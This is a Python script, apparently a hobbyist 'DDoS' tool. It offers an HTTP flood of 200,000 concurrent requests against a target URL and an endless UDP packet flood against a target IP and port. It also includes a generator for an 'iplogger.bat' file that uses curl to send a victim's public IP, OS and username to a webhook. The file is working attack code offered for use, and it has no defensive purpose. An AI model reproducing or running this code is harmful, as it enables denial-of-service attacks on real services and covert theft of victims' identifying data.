import aiohttp
import asyncio
import time
import sys
import colorama 
from colorama import Fore
import os 
from pystyle import *
import socket
import requests

colorama.init(convert=True, autoreset=True)
colorama.just_fix_windows_console()


os.system('cls') if os.name == 'nt' else os.system('clear')
print(f"""

{Fore.RED}░█████╗░███╗░░░███╗██╗██████╗░  ██████╗░██████╗░░█████╗░░██████╗
{Fore.RED}██╔══██╗████╗░████║██║██╔══██╗  ██╔══██╗██╔══██╗██╔══██╗██╔════╝
{Fore.RED}███████║██╔████╔██║██║██████╔╝  ██║░░██║██║░░██║██║░░██║╚█████╗░
{Fore.RED}██╔══██║██║╚██╔╝██║██║██╔══██╗  ██║░░██║██║░░██║██║░░██║░╚═══██╗
{Fore.RED}██║░░██║██║░╚═╝░██║██║██║░░██║  ██████╔╝██████╔╝╚█████╔╝██████╔╝
{Fore.RED}╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝░░╚═╝  ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
{Fore.RESET}                                                                                 

""")
webhook = ""
print(f"{Fore.RED} [1] DDoS{Fore.RESET}")
print(f"{Fore.RED} [2] IP Bomb{Fore.RESET}")
choice = input('==> ')

packets = 0
fetches = 0
url = ""

def send_packet(ipa, port):
    global packets
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto('Cyber DoS'.encode('utf-8'), (ipa, port))

    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        s.close()
def ipbomb(ip, port):
    global packets
    os.system('cls') if os.name == 'nt' else os.system('clear')
    while True:
        send_packet(ip, port)
        packets += 1
        sys.stdout.write(f'Packets sent: {packets} | Ip: {ip}, Port: {port}')
        
async def flood(session, url):
    global fetches
    while True:
        try:
            async with session.get(url) as response:
                fetches += 1
                sys.stdout.write(f"Status: {response.status} | Requests: [{fetches}]\r")
        except Exception as e:
            sys.stdout.write(f"Error: {e}\r")

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [flood(session, url) for _ in range(200000)] 
        await asyncio.gather(*tasks)
        
def buildlogger(wb):
    code = f"""@echo off
:: WEBHOOK
set webhook={wb}

:: GETTING THE IP
curl ifconfig.co/ > ip.txt
set /p ip=<ip.txt
del ip.txt

curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%ip%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%os%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%username%\\"}}" %webhook%

"""
    with open('iplogger.bat', 'w', encoding='utf-8') as f:
        f.write(code)
    print("[+] ip.logger success")
    

if int(choice) == 1:
    url = str(input('Target URL >> '))
    asyncio.run(main())
elif int(choice) == 2:
    ip = str(input('Target IP >> '))
    port = int(input('Port >> '))
    ipbomb(ip, port)
